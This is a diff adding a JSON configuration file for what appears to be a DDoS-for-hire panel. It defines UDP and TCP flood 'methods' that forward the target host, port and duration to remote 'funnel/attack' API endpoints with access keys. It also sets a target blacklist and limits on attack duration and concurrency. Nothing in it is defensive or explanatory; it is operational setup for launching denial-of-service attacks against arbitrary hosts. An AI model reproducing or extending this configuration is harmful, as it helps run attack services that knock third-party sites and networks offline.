@@ -1,0 +1,58 @@
+{
+    "Blacklists" : [
+        "1.1.1.1",
+        ".ru"
+    ],
+    "Methods" : [
+        {
+            "Name" : "udp",
+            "API" : "udp",
+            "Description" : "simple user datagram protocol vector",
+            "Enabled": true,
+            "Targets": [
+                {
+                    "Enabled" : true,
+                    "Method" : "udp",
+                    "Target" : "http://1.67.104.94:6060/funnel/attack?key=aqua&host=[target]&port=[port]&time=[duration]&method=[method]",
+                    "URLEncode" : true,
+                    "Debugging": false
+                }
+            ],
+            "Management" : {
+                "DefaultPort": 80,
+                "MaxConcurrents": 1,
+                "MaxDuration": 3600,
+                "AdminMethod": false,
+                "VIPMethod": false,
+                "HolderMethod": false,
+                "RawMethod": false,
+                "Timeout": 15
+            }
+        },
+        {
+            "Name" : "tcp",
+            "API" : "tcp",
+            "Description" : "simple transmission control protocol vector",
+            "Enabled": true,
+            "Targets": [
+                {
+                    "Enabled" : true,
+                    "Method" : "tcp",
+                    "Target" : "http://1.5.3.6:5/funnel/attack?key=d&host=[target]&port=[port]&time=[duration]&method=[method]",
+                    "URLEncode" : true,
+                    "Debugging": false
+                }
+            ],
+            "Management" : {
+                "DefaultPort": 80,
+                "MaxConcurrents": 1,
+                "MaxDuration": 3600,
+                "AdminMethod": false,
+                "VIPMethod": false,
+                "HolderMethod": false,
+                "RawMethod": false,
+                "Timeout": 15
+            }
+        }
+    ]
+}
